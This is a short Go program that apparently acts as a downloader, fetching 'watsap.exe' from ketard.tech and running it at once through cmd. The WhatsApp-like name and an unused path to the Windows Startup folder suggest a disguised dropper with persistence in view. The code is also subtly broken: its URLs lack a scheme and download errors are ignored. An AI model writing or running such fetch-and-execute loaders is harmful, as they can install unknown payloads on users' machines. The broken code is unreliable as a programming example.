package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

var URL = "ketard.tech/watsap-ota"
var WinURL = "ketard.tech/watsap-ota/watsap" + ".exe"
var userName = os.Getenv("USERNAME")

var AutoStartDir = "C:/Users/" + userName + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

func download(url string, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

// start the program
func startProgram() {
	cmd := exec.Command("cmd", "/C", "start", getCurrentDir()+"/watsap.exe")
	err := cmd.Run()
	if err != nil {
		panic(err)
	}
}

// get current directory
func getCurrentDir() string {
	dir, err := os.Getwd()
	if err != nil {
		panic(err)
	}
	return dir
}

func main() {
	download(WinURL, getCurrentDir()+"/watsap.exe")
	startProgram()

}
